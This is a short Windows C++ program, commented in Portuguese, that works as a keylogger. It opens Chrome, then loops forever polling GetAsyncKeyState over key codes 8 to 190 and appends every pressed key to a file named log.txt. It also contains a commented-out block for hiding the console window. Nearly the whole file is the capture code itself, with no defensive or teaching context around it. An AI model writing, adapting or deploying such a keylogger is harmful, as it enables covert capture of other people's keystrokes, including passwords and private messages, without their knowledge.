//Alzemand
#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <cstdlib>

using namespace std;

int salvar(int tecla, char *file);

int main()
  {
  /* SetConsoleTitle("Titulo");
  HWND wnd = FindWindow(0, "Titulo");
  if( wnd != NULL )
  {
  ShowWindow(wnd, SW_HIDE);
  }*/
  char a;
  system("start chrome");
  while(true){

    for(a=8;a<=190;a++){
      if(GetAsyncKeyState(a) == -32767) // captura as teclas !!
      salvar(a,"log.txt");
     }

  }

return 0;
}


int salvar(int tecla, char *file){

  FILE *newarquivo;
  newarquivo = fopen(file, "a+");
  cout << tecla;
  fprintf(newarquivo, "%s", &tecla);

  return 0;
} 
